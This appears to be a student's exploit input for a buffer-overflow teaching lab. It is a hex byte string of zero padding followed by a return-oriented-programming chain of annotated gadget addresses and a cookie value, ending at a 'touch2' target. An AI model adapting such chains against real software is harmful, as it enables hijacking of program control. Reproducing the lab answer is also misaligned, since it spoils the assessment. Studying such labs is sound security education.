00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
4d 1a 40 00 00 00 00 00 /* setval_100 = pop rax */
05 83 1e 38 00 00 00 00 /* cookie */
c1 19 40 00 00 00 00 00 /* getval_334 = mov rax, rdi */
2b 1a 40 00 00 00 00 00 /* getval_251 = pop rbx */
af 29 b4 92 00 00 00 00 /* cookie ^ 0xaaaaaaaa */
fd 19 40 00 00 00 00 00 /* addval_388 = mov rbx, rdx */
46 1a 40 00 00 00 00 00 /* setval_264 = mov rdx, rcx */
04 1a 40 00 00 00 00 00 /* setval_151 = mov rcx, rsi */
a5 16 40 00 00 00 00 00 /* touch2 */
